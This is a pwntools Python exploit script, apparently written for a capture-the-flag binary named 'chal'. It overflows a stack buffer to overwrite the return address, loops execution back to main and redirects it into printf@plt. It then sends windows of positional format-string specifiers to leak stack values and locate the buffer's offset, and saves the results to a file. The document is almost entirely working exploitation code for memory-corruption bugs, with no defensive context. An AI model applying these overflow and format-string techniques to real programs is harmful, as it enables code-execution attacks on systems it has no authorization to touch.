from pwn import *
context.arch='amd64'; context.log_level='error'
e=ELF("./chal")
PRINTF=e.plt['printf']; MAIN=e.symbols['main']
def build(fmt, ret):
    body=(b"exit"+fmt).ljust(0x58,b"A")
    assert b"\x00" not in body, "null in body"
    return body+p64(ret)

# We need the fmt to include a marker qword and many %p. But fmt lives in buf[4:0x58] (<=84 bytes),
# and the buffer AFTER 0x58 is the ret addr. The A-padding (0x54-len(fmt)) and the marker...
# Put marker at a fixed spot: make fmt end with 8-byte marker aligned. Then scan indices.
p=process("./chal")
def rnd(pl):
    p.recvuntil(b">> ", timeout=3); p.send(pl)
for i in range(3): rnd(build(b"", MAIN))
# fmt: read indices 6..40 to find our marker and buffer A's (0x4141414141414141)
out=b""
# probe in windows to keep fmt<=84 bytes; re-prime each connection for determinism
p.close()
def probe(lo,hi):
    pp=process("./chal")
    def r(pl):
        pp.recvuntil(b">> ", timeout=3); pp.send(pl)
    for i in range(3): r(build(b"",MAIN))
    fmt=b".".join(("%%%d$p"%i).encode() for i in range(lo,hi))
    assert len(fmt)<=0x54, len(fmt)
    r(build(fmt, PRINTF))
    import time; time.sleep(0.3)
    dd=pp.recvall(timeout=3); pp.close()
    return dd
out+=b"\n[6-16]\n"+probe(6,17)
out+=b"\n[17-27]\n"+probe(17,28)
out+=b"\n[28-38]\n"+probe(28,39)
open("/work/waf_findidx_out.txt","wb").write(out)
print("saved", len(out))
